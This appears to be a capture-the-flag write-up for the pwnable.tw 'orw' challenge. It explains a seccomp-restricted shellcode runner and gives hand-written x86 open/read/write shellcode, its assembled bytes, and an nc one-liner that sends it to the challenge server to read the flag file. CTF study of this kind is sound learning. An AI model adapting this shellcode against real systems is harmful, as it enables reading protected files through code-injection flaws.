+++
title = "pwnable.tw - orw"
date = 2019-06-11T19:45:48.202Z
updated = 2019-09-15T19:37:08.225Z
aliases = ["/posts/5d0004ec2569df08a43d04cf-pwnabletw-orw"]
[taxonomies]
tags = ['pwnable.tw', 'binary-exploitation', 'pwntools', 'assembly', 'shellcode']
categories = ["ctf-writeups"]
+++

# Challenge

> Read the flag from `/home/orw/flag`.
> 
> Only open read write syscall are allowed to use.
>
> `nc chall.pwnable.tw 10001`

# Solution
The binary simply reads in 200 bytes and then jumps to its address, after using `prctl` to prevent calling `execve`:

```cpp
int main(void) {
  orw_seccomp();
  printf("Give my your shellcode:");
  read(0,shellcode,200);
  (*(code *)shellcode)();
  return 0;
}
```

By using `strace`, we see that `orw_seccomp` calls `prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, {len = 12, filter = 0x400000020})`.  
Based on this and the challenge description, it is clear that we cannot use a `execve` shell code like in the 
[previous challenge](https://srikavin.me/blog/posts/5cfff3292569df08a43d04cc-pwnabletw-start).

To assemble shellcode, I used an [online x86 assembler](https://defuse.ca/online-x86-assembler.htm) rather than setting 
up nasm. We know that the flag is located in `/home/orw/flag`. Our shellcode needs to accomplish the following:

<!-- more -->

```cpp
char[0x30] buffer;
fd = open("/home/orw/flag", RD_ONLY);
read(fd, buffer, 0x30);
write(stdout, buffer, 0x30);
```

We can refer to a [Linux x86 syscall table](http://shell-storm.org/shellcode/files/syscalls.html) to see the syscall 
numbers. The following is (sub-optimal) assembly code that I wrote that will open the file, read its contents, and write 
to `stdout`.

```asm
push 0x6761
push 0x6C662F77
push 0x726F2F65
push 0x6D6F682F

# open('/home/orw//flag', RD_ONLY)
xor eax, eax
add eax, 5
mov ebx, esp
xor ecx, ecx # 0 = RD_ONLY
xor edx, edx # 
int 0x80

# read(fd, esp, 0x30)
mov ebx, eax
mov eax, 3
mov ecx, esp
add edx, 0x30
int 0x80

# write(1, esp, 0x30)
mov eax, 4
xor ebx, ebx
add ebx, 1
mov ecx, esp
int 0x80
```

Assembling it gives us the following byte string:
```
\x68\x61\x67\x00\x00\x68\x77\x2F\x66\x6C\x68\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\x31\xC0\x83\xC0\x05\x89\xE3\x31\xC9\x31\xD2\xCD\x80\x89\xC3\xB8\x03\x00\x00\x00\x89\xE1\x83\xC2\x30\xCD\x80\xB8\x04\x00\x00\x00\x31\xDB\x83\xC3\x01\x89\xE1\xCD\x80
```
Now we just have to pipe into the challenge, and we get the flag.
```
python -c 'print "\x68\x61\x67\x00\x00\x68\x77\x2F\x66\x6C\x68\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\x31\xC0\x83\xC0\x05\x89\xE3\x31\xC9\x31\xD2\xCD\x80\x89\xC3\xB8\x03\x00\x00\x00\x89\xE1\x83\xC2\x30\xCD\x80\xB8\x04\x00\x00\x00\x31\xDB\x83\xC3\x01\x89\xE1\xCD\x80" | nc chall.pwnable.tw 10001
```
